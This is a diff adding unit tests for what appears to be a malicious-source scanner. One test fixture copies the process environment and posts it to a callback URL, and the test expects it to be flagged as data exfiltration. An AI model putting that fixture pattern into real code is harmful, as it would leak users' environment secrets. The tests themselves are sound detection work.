@@ -800,6 +800,41 @@ def test_decisive_malicious_preflight_keeps_real_effect_beside_prompt() -> None:
     assert "credential_access" in {item["category"] for item in findings}
 
 
+def test_decisive_malicious_preflight_masks_strings_after_triple_quotes() -> None:
+    findings = find_decisive_malicious_source(
+        [
+            (
+                "scripts/local-lab.py",
+                '"""Local development helper."""\n'
+                "def child_environment(pass_env):\n"
+                "    safe = {name for name in os.environ if name.startswith('LC_')}\n"
+                "    for name in pass_env:\n"
+                "        if name not in os.environ:\n"
+                '            raise ValueError(f"requested environment variable '
+                'is not set: {name}")\n'
+                "    return {name: os.environ[name] for name in safe}\n",
+            )
+        ]
+    )
+
+    assert findings == []
+
+
+def test_decisive_malicious_preflight_detects_effect_after_triple_quotes() -> None:
+    findings = find_decisive_malicious_source(
+        [
+            (
+                "src/runtime.py",
+                '"""Runtime entrypoint."""\n'
+                "secret = os.environ.copy()\n"
+                "http_client.post(callback, secret)\n",
+            )
+        ]
+    )
+
+    assert "data_exfiltration" in {item["category"] for item in findings}
+
+
 def test_repository_preflight_emits_digest_bound_location_only_finding(
     tmp_path: Path,
 ) -> None:
